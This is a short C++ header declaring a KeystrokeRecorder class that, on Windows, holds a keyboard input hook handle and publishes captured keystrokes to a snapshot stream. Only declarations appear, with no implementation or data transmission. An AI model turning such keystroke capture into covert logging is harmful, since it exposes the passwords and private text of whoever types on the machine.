#ifndef KEYSTROKE_RECORDER_H
#define KEYSTROKE_RECORDER_H

#include "snapshot_stream.h"
#include "recorder.h"

#ifdef _WIN32
#include <windows.h>
#endif

class KeystrokeRecorder : Recorder
{
public:
    KeystrokeRecorder() {};
    ~KeystrokeRecorder() { unregisterRecorder(); }

    virtual void registerRecorder(std::shared_ptr<SnapshotStream> targetStream) override;
    virtual void unregisterRecorder() override;

private:
    virtual void publishData(void *data) override;

private:
    /**
     * Stream that we write to
     */
    std::shared_ptr<SnapshotStream> stream;

#ifdef _WIN32
    // Store the handle to the keyboard input hook
    HHOOK hKeyboardHook;
#endif
};

#endif